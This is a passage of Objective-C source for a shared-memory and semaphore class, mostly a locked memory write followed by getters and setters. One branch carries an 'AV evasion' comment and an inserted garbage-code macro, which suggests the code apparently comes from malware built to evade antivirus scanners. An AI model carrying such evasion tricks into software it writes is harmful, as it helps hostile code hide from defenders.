    memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryLog));
    
    [self _unlockShmem];
  }
  else
  {
    //memoryState = *(unsigned int *)(mSharedMemory + anOffset);
    
    [self _lockShmem];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryCommand));
    
    [self _unlockShmem];
  }
  
  return TRUE;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setSharedMemory: (char *)value
{
  mSharedMemory = value;
}

- (char *)mSharedMemory
{
  return mSharedMemory;
}

- (void)setSharedMemoryID: (int)value
{
  mSharedMemoryID = value;
}

- (int)mSharedMemoryID
{
  return mSharedMemoryID;
}

- (void)setKey: (int)value
{
  mKey = value;
}

- (int)mKey
{
  return mKey;
}

- (void)setSize: (int)value
{
  mSize = value;
}

- (int)mSize
{
  return mSize;
}

- (sem_t *)mSemaphoreID
{
  return mSemaphoreID;
}

- (void)setSemaphoreID: (sem_t *)value
{
  mSemaphoreID = value;
}

- (void)setSemaphoreName: (NSString *)value
{
  if (value != mSemaphoreName)
  {
    [mSemaphoreName release];
    mSemaphoreName = [value retain];
  }
}

- (NSString *)mSemaphoreName
{
  return mSemaphoreName;
}


@end

